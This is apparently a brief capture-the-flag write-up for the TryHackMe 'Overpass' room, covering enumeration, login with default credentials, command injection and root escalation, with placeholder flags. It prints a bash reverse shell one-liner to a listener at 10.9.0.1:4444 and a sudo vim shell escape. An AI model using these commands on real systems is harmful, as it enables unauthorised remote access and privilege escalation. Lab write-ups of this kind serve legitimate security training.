# Room Name: Overpass

## 📌 Room Link:
[TryHackMe - Overpass](https://tryhackme.com/room/overpass)

## 🧠 Objectives:
- Enumerate the web app
- Exploit developer account
- Escalate privileges to root

## 🔍 Enumeration:
- Nmap Scan:  
nmap -sC -sV -oN nmap/initial.txt 10.10.10.10


- Ports open: 22 (SSH), 80 (HTTP)

## 🌐 Web Analysis:
- Found login page at `/admin`
- Source code leak reveals default credentials

## 💥 Exploitation:
- Logged in with `admin:admin`
- Command injection on `/api/debug`
- Reverse shell using bash:
bash -i >& /dev/tcp/10.9.0.1/4444 0>&1


## 🔝 Privilege Escalation:
- `sudo -l` shows NOPASSWD on `vim`
- Escalated using:
sudo vim -c '!sh'

## ✅ Flags:
- User: `THM{user_flag_here}`
- Root: `THM{root_flag_here}`

## 🗒️ Notes:
- First time using vim for privesc
